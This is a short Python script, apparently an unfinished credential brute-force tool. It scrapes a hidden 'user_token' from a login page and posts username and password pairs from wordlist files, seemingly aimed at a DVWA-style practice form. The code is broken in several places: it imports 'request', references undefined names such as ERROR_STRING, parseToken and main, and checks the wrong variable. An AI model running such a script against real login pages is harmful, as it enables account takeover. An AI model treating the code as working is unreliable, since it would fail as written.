import request
import sys
def Brute_Force(userName,password,URL):
	COOKIES, USER_TOKEN= setSessionCookie(URL)
	post_data={'username':userName,'password':password,'Login':'Login','user_token':USER_TOKEN}
	post_request=request.post(URL, data=post_data,cookies=COOKIES)
	if ERROR_STRING not in post:
		print("FOUND")
		print("Username : "+userName)
		print("Password : "+password)


def CreateList(FILENAME):
	userName=open("username.txt","r")
	password=open("password.txt","r")

	userNameList=userName.read().split("\n")
	passwordList=password.read().split("\n")

	return userNameList,passwordList
def setSessionCookie(URL):
	pre_req = request.get(URL)
	user_token=parseToken(pre_req.text)
	return pre_req.cookies, user_token
def parseUserToken(FULL_TEXT):
	HINT_STRINGS="name='user_token'"
	temp=""
	TEXT_LIST=FULL_TEXT.split("\n")
	for satir in TEXT_LIST:
		if HINT_STRINGS in satir:
			temp=satir
		else:
			continue
	temp=temp.replace("<input type='hidden' name='user_token' value'","")
	temp=temp.split("'")
	userToken=temp[0]
	userToken=userToken.replace("\t","")
	return userToken


def get(url):
	pre_req= request.get()

if __name__ == '__main__':
	main()

			
